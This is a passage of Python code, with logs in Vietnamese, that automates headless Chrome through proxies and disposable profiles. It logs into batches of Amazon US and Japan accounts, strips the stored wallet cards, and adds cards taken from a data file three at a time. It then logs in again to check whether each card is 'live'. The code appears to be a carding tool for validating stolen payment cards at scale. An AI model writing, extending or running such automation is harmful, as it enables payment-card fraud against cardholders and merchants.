        num_per_thread_data_1 = 3
        data_chunks = [data_list[i:i + num_per_thread_data_1] for i in range(0, len(data_list), num_per_thread_data_1)]
        num_acc = len(acc_list)
        num_chunks = len(data_chunks)
        if not acc_list:
            logger.info(f"Worker {worker_id} không có tài khoản để xử lý.")
            return
        
        for index, acc in enumerate(acc_list):
            if index >= len(data_chunks):
                logger.info(f"[Worker {worker_id}] Không còn thẻ để xử lý cho tài khoản {acc}")
                break
            current_data_chunk = data_chunks[index]
            profile_dir_add = random_profile()
            driver_add = None
            chrome_pid_add = None
            chrome_pid = None
            success = "Success"
            logger.info(f"[Worker {worker_id}] ===> Tài khoản {acc} đang xử lý thẻ: {current_data_chunk}")

            try:
                driver_add = chrome_options(proxy, profile_dir_add, headless, x_coord, y_coord)
                time.sleep(1)
                chrome_pid_add = driver_add.service.process.pid

                if headless != 'y':
                    driver_add.set_window_position(x_coord, y_coord)
                    driver_add.set_window_size(500, 500)
                    
                remove_list_data('data.txt', current_data_chunk, lock) 
                
                if option == 1:
                        us_ok = login_acc_amz_us(driver_add, option = option, acc_current=acc, lock=lock)  
                        if us_ok:
                            try:
                                remove_card_wallet_us(driver_add)
                            except:
                                remove_card_wallet_us(driver_add)  
                            add_card_us(driver_add, acc, current_data_chunk, lock)
                        else:
                            unk_list('output/unk.txt', current_data_chunk, lock) 
                elif option == 4:
                        us_ok = login_acc_amz_jp(driver_add, option = option, acc_current=acc, lock=lock)  
                        if us_ok:
                            try:
                                remove_card_wallet_jp(driver_add)
                            except:
                                remove_card_wallet_jp(driver_add)  
                            add_card_jp(driver_add, acc, current_data_chunk, lock)
                        else:
                            unk_list('output/unk.txt', current_data_chunk, lock)  
                time.sleep(2)                            
            except Exception as e:
                logger.error(f"Lỗi khi xử lý tài khoản {acc} thẻ: {current_data_chunk}\n{e}")
            finally:
                if driver_add:
                    try:
                        driver_add.close()
                        driver_add.quit()
                    except Exception as e:
                        logger.warning(f"[Worker {worker_id}] Lỗi khi đóng driver_add: {e}")
                if profile_dir_add:         
                    delete_profile(profile_dir_add)
                
        for index, acc in enumerate(acc_list):
            if index >= len(data_chunks):
                logger.info(f"[Worker {worker_id}] Không còn thẻ để xử lý cho tài khoản {acc}")
                break
            current_data_chunk = data_chunks[index]
            profile_dir = random_profile()
            driver = None
            chrome_pid_add = None
            chrome_pid = None
            success = "Failed"
            logger.info(f"[Worker {worker_id}] Đang kiểm tra status acc: {acc} và thẻ: {current_data_chunk}")

            try:
                driver = chrome_options(proxy, profile_dir, headless, x_coord, y_coord)
                time.sleep(1)
                chrome_pid = driver.service.process.pid

                if headless != 'y':
                    driver.set_window_position(x_coord, y_coord)
                    driver.set_window_size(500, 500)
                                                
                if option == 1:
                        us_ok = login_acc_amz_us(driver, option = option, acc_current=acc, lock=lock)  
                        if us_ok:
                            check_status_live_us(driver, acc, current_data_chunk, lock)
                        else:
                            unk_list('output/unk.txt', current_data_chunk, lock) 
                elif option == 4:
                        us_ok = login_acc_amz_jp(driver, option = option, acc_current=acc, lock=lock)  
                        if us_ok:
                            check_status_live_jp(driver, acc, current_data_chunk, lock)
                        else:
                            unk_list('output/unk.txt', current_data_chunk, lock)   
                                                  
                success = "Success"
                result_queue.put(("completed", f"{acc} với {current_data_chunk}", success))
                time.sleep(1) 
            except Exception as e:
                logger.error(f"Lỗi khi xử lý tài khoản {acc} thẻ: {current_data_chunk}\n{e}")
                result_queue.put(("completed", f"{acc} với {current_data_chunk}", "Failed"))
                time.sleep(1) 
            finally:
                if driver:
                    try:
                        driver.close()
                        driver.quit()
                    except Exception as e:
                        logger.warning(f"[Worker {worker_id}] Lỗi khi đóng driver_add: {e}")
                if profile_dir:        
                    delete_profile(profile_dir)
        send_files_threadsafe()      
        if chrome_pid_add:     
            clean_profile(chrome_pid_add, profile_dir_add, option)
        if chrome_pid:        
            clean_profile(chrome_pid, profile_dir, option)         
        if proxy:
            proxy_queue.put(proxy)
        acc_list_queue.put(acc_list)

    # -----------------------------
    # -----------------------------
    else:
        profile_dir = random_profile()
        driver = None
        chrome_pid = None
        success = False

        try:
            if option == 2 or option == 3:
                driver = chrome_options(proxy, profile_dir, headless, x_coord, y_coord)

            time.sleep(1)
            chrome_pid = driver.service.process.pid

            if headless != 'y':
                driver.set_window_position(x_coord, y_coord)
                driver.set_window_size(500, 500)

            success = process_automation_selenium(driver, acc_list, data_list, option, lock)
            dem = data_list if option in [1, 4] else acc_list
            result_queue.put(("completed", dem, success))

        except Exception as e:
            result_queue.put(("completed", acc_list, False))
            logger.error(f"Lỗi trong worker {worker_id}: {e}")

        finally:
            clean_profile(chrome_pid, profile_dir, option)
            logger.info(f"Đã dọn dẹp process Chrome {chrome_pid}")
            logger.info(f"Đã đóng trình duyệt cho danh sách tài khoản: {acc_list}")

            if proxy:
                proxy_queue.put(proxy)